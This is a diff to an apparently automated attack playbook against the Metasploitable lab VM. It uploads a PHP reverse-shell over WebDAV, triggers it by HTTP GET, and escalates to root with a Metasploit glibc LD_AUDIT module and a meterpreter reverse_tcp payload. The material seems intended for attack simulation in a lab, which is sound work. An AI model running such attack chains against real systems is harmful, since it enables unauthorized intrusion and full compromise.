@@ -5,7 +5,7 @@
 #     1. Create php-reverseshell-payload
 #     2. Start reverseshell-listener in background
 #     3. Upload php-reverseshell-payload via webdav
-#     4. Execute php-reverseshell-payload via curl in background
+#     4. Execute php-reverseshell-payload via http-get in background
 #     6. execute commands via reverseshell
 #
 # Requirements:
@@ -53,9 +53,10 @@ commands:
   - type: sleep
     seconds: 10
 
-  # execute shell via curl
-  - type: shell
-    cmd: curl http://$METASPLOITABLE/dav/shell.php
+  # execute shell via http-get in background
+  - type: http-client
+    cmd: GET
+    url: http://$METASPLOITABLE/dav/shell.php
     background: true
     kill_on_exit: true
 
@@ -76,7 +77,6 @@ commands:
     varstore: True
 
   - type: msf-module
-    #cmd: exploit/linux/local/udev_netlink does not work
     cmd: exploit/linux/local/glibc_ld_audit_dso_load_priv_esc
     creates_session: root
     payload: linux/x86/meterpreter/reverse_tcp
